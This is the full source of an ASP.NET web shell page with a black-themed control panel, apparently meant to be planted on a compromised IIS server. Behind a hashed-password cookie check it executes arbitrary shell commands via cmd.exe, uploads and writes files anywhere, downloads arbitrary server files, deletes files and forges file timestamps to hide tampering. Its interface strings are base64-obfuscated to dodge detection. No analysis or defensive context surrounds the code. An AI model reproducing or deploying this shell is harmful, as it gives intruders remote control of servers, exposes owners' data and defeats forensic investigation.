<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
c();
NameValueCollection t=HttpContext.Current.Request.Form;
pwd=t["pwd"];
pro=t["pro"];
cmd=t["cmd"];
sav=t["sav"];
vir=t["vir"];
nen=t["nen"];
upb=t["upb"];
upd=t["upd"];
del=t["del"];
don=t["don"];
hid=t["hid"];
tfil=t["tfil"];
ttar=t["ttar"];
ttim=t["ttim"];
if (!string.IsNullOrEmpty(pwd))
c(pwd);
else if (!string.IsNullOrEmpty(cmd))
r(pro, cmd);
else if (HttpContext.Current.Request.Files["upl"] != null)
u(HttpContext.Current.Request.Files["upl"], sav, string.IsNullOrEmpty(vir) ? false : true, nen);
else if (!string.IsNullOrEmpty(upb))
h(upb, upd);
else if (!string.IsNullOrEmpty(del))
d(del);
else if (!string.IsNullOrEmpty(don))
z(don);
else if (!string.IsNullOrEmpty(tfil))
g(hid, tfil, ttar, ttim);

if (HttpContext.Current.Request.Cookies["data"] != null)
{
string data = HttpContext.Current.Request.Cookies["data"].Value;
string[] data2 = data.Split(new string[]{"#|#"}, StringSplitOptions.None);
for (int i = 0; i < data2.Length; i++)
{
string[] data3 = data2[i].Split(new string[] { "#=#" }, StringSplitOptions.None);
switch (data3[0])
{
case"pro":pro=a(pro,data3[1]);break;
case"cmd":cmd=a(cmd,data3[1]);break;
case"sav":sav=a(sav,data3[1]);break;
case"vir":vir=a(vir,data3[1]);break;
case"nen":nen=a(nen,data3[1]);break;
case"don":don=a(don,data3[1]);break;
case"tfil":tfil=a(tfil,data3[1]);break;
case"ttar":ttar=a(ttar,data3[1]);break;
case"ttim":ttim=a(ttim,data3[1]);break;
}
}
}

view();
    %>
<script runat="server">
string pwd,pro,cmd,sav,vir,nen,upb,upd,del,don,hid,tfil,ttar,ttim;
bool aut = false;
string pp = "hydnBMkiM4nfTnyV0xjVKURvBWA=";
string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
void view()
{
string data = string.Format("pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#=#{6}#|#ttar#=#{7}#|#ttim#=#{8}", pro, cmd, sav, vir, nen, don, tfil, ttar, ttim);
HttpCookie coo = new HttpCookie("data", data);
coo.Expires = DateTime.Now.AddDays(1);
HttpContext.Current.Response.SetCookie(coo);
}
void c(string pwd)
{
try
{
HttpCookie coo = new HttpCookie("pwd", pwd);
coo.Expires = DateTime.Now.AddDays(1);
HttpContext.Current.Response.SetCookie(coo);
aut = Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pwd))) == pp;
}
catch (Exception e) { log.InnerText = e.Message; }
}
bool c()
{
try
{
if (HttpContext.Current.Request.Cookies["pwd"] != null)
{
aut = Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(HttpContext.Current.Request.Cookies["pwd"].Value))) == pp;
return aut;
}
}
catch (Exception e) { log.InnerText = e.Message; }
return false;
}
void u(HttpPostedFile upl, string sav, bool vir, string nen)
{
try
{
if (c())
{
if (upl != null && upl.ContentLength > 0)
{
string fn = string.IsNullOrEmpty(nen) ? System.IO.Path.GetFileName(upl.FileName) : nen;
string path = vir ? Server.MapPath(sav) : sav;
string SaveLocation = System.IO.Path.HasExtension(path) ? path : path.TrimEnd('\\') + "\\" + fn;
upl.SaveAs(SaveLocation);
log.InnerHtml = "File uploaded successfuly : " + SaveLocation;
}
}
}
catch (Exception ex) { log.InnerText = ex.Message; }
}
void r(string pro, string cmd)
{
try
{
if (c())
{
System.Diagnostics.Process n = new System.Diagnostics.Process();
n.StartInfo.FileName = ( string.IsNullOrEmpty(pro) ? "cmd.exe" : pro);
n.StartInfo.UseShellExecute = false;
n.StartInfo.RedirectStandardInput = true;
n.StartInfo.RedirectStandardOutput = true;
n.StartInfo.RedirectStandardError = true;
n.StartInfo.CreateNoWindow = true;
string o = null;
n.Start();
n.StandardInput.WriteLine(cmd);
n.StandardInput.WriteLine("exit");
o = n.StandardOutput.ReadToEnd();
n.WaitForExit();
n.Close();
log.InnerHtml = HttpUtility.HtmlEncode(o);
}
}
catch (Exception ex) { log.InnerText = ex.Message; }
}
void z(string don)
{
try
{
if (c() && !string.IsNullOrEmpty(don))
{
byte[] f = System.IO.File.ReadAllBytes(don);
System.Web.HttpContext t = System.Web.HttpContext.Current;
t.Response.Clear();
t.Response.ClearHeaders();
t.Response.ClearContent();
t.Response.AppendHeader("content-length", f.Length.ToString());
t.Response.ContentType = "application/octet-stream";
t.Response.AppendHeader("content-disposition", "attachment; filename=" + don.Substring(don.LastIndexOf('\\') + 1));
t.Response.BinaryWrite(f);
t.Response.End();
}
}
catch (Exception ex) { log.InnerText = ex.Message; }
}
void ti(string tt)
{
log.InnerHtml += "Creation Time :\t\t" + System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss") + "<br>";
log.InnerHtml += "Last Access Time :\t" + System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss") + "<br>";
log.InnerHtml += "Last Write Time :\t" + System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");
}
void g(string hid, string tfil, string ttar, string ttim)
{
try
{
if (c() && !string.IsNullOrEmpty(tfil))
{
log.InnerHtml = string.Empty;
if (hid == "1")
ti(tfil);
else if (hid == "2")
{
if (!string.IsNullOrEmpty(ttar))
{
System.IO.File.SetCreationTime(tfil, System.IO.File.GetCreationTime(ttar));
System.IO.File.SetLastAccessTime(tfil, System.IO.File.GetLastAccessTime(ttar));
System.IO.File.SetLastWriteTime(tfil, System.IO.File.GetLastWriteTime(ttar));

log.InnerHtml = "Time successfuly changed :<br>";
log.InnerHtml += tfil + "<br>";
ti(tfil);
}
}
else if (hid == "3")
{
if (!string.IsNullOrEmpty(ttim))
{
DateTime te = DateTime.Parse(ttim);
System.IO.File.SetCreationTime(tfil, te);
System.IO.File.SetLastAccessTime(tfil, te);
System.IO.File.SetLastWriteTime(tfil, te);

log.InnerHtml = "Time successfuly changed :<br>";
log.InnerHtml += tfil + "<br>";
ti(tfil);
}
}
}
}
catch (Exception ex) { log.InnerText = ex.Message; }
}

void h(string upb, string upd)
{
try
{
if (c() && !string.IsNullOrEmpty(upb) && !string.IsNullOrEmpty(upd))
{
System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath() + upd, Convert.FromBase64String(upb));
log.InnerText = upd + " successfuly uploaded";
}
}
catch (Exception ex) { log.InnerText = ex.Message; }
}

void d(string del)
{
try
{
if (c() && !string.IsNullOrEmpty(del))
{
System.IO.File.Delete(System.IO.Path.GetTempPath() + del);
log.InnerText = del + " successfuly deleled";
}
}
catch (Exception ex) { log.InnerText = ex.Message; }
}
    
string x(string f) { return Encoding.UTF8.GetString(Convert.FromBase64String(f)); }
</script>
<style>
body,html{margin:0;padding:3px 0 0 3px;direction:ltr;background:#000;color:#fff;}
form{margin:0;}
*{font:14px "Lucida Console";}
t{width:180px;display:inline-block;text-align:right;padding-right:5px;}
g{margin-left:30px;}
input[type="text"],input[type="file"] {width:50%;height:25px;background:#444;color:#fff;border:1px solid #999;margin-bottom:3px;}
input[type="text"]{padding:2px;}
input[type="button"],input[type="submit"] {height:23px;}
input[type="checkbox"]{width:23px;height:24px;position:absolute;margin:0;}
hr{margin:0;border:0;border-top:1px solid #DDD;}
.h{width:100px;text-align:center;background:#003DA7;vertical-align:middle;}
table{width:100%;margin:0;border-collapse:collapse;}
.b{padding:10px 0px 9px;}
</style>
<script>
function use() { var n = document; var d = n.getElementById("d").innerHTML; d = d.substring(0, d.lastIndexOf('\\') + 1); n.getElementsByName("cmd")[0].value += d; n.getElementsByName("sav")[0].value += d; n.getElementsByName("don")[0].value += d; }
</script>
</head>
<body>
<table>
<tr>
<td class="h"><%=x("QWRkcmVzcw==")%></td>
<td class="b">
<t><%=x("Q3VycmVudA==")%> :</t>
<y id="d"><%= Server.MapPath(string.Empty) + "\\"%></y>
<input type="button" value="<%=x("VXNl")%>" onclick="use()" />
</td>
</tr>
</table>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("TG9naW4=")%></td>
<td class="b">
<t><%=x("RG8gaXQ=")%> :</t>
<input name="pwd" type="text" style='background-color: <%= aut ? "Green" : "Red" %>' />
<input type="submit" value="<%= x("RG8gaXQ=") %>" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("Q29tbWFuZA==")%></td>
<td class="b">
<t><%=x("UHJvY2Vzcw==")%> :</t>
<input name="pro" type="text" value="<%= string.IsNullOrEmpty(pro) ? x("Y21kLmV4ZQ==") : pro %>" /><br>
<t><%=x("Q29tbWFuZA==")%> :</t>
<input name="cmd" type="text" value="<%= cmd %>" />
<input type="submit" value="<%= x("RXhlY3V0ZQ==") %>" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post" enctype="multipart/form-data">
<table>
<tr>
<td class="h"><%=x("VXBsb2Fk")%></td>
<td class="b">
<t><%=x("RmlsZSBuYW1l")%> :</t>
<input name="upl" type="file" /><br>
<t><%=x("U2F2ZSBhcw==")%> :</t>
<input name="sav" type="text" value="<%= sav %>" />
<input name="vir" type="checkbox" /><g><%=x("SXMgdmlydHVhbCBwYXRo")%></g><br>
<t><%=x("TmV3IEZpbGUgbmFtZQ==")%> :</t>
<input name="nen" type="text" value="<%= nen %>" />
<input type="submit" value="<%= x("VXBsb2Fk") %>" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("RG93bmxvYWQ=")%></td>
<td class="b">
<t><%=x("RmlsZSBuYW1l")%> :</t>
<input name="don" type="text" value="<%= don %>" />
<input type="submit" value="<%= x("RG93bmxvYWQ=") %>" />
</td>
</tr>
</table>
</form>
<hr />
<form method="post">
<table>
<tr>
<td class="h"><%=x("Q2hhbmdlIENyZWF0aW9uIFRpbWU=")%></td>
<td class="b">
<input name="hid" type="hidden" />
<t><%=x("RmlsZSBuYW1l")%> :</t>
<input name="tfil" type="text" value="<%= tfil %>" />
<input type="submit" value="<%= x("R2V0") %>" onclick="document.getElementsByName('hid')[0].value = '1'" /><br>
<t><%=x("RnJvbSBUaGlzIEZpbGU=")%> :</t>
<input name="ttar" type="text" value="<%= ttar %>" />
<input type="submit" value="<%= x("U2V0") %>" onclick="document.getElementsByName('hid')[0].value = '2'" /><br>
<t><%=x("TmV3IFRpbWU=")%> :</t>
<input name="ttim" type="text" value="<%= ttim %>" />
<input type="submit" value="<%= x("U2V0") %>" onclick="document.getElementsByName('hid')[0].value = '3'" />
</td>
</tr>
</table>
</form>
<hr />
<br />
<pre id="log" runat="server"></pre>
</body>
</html>
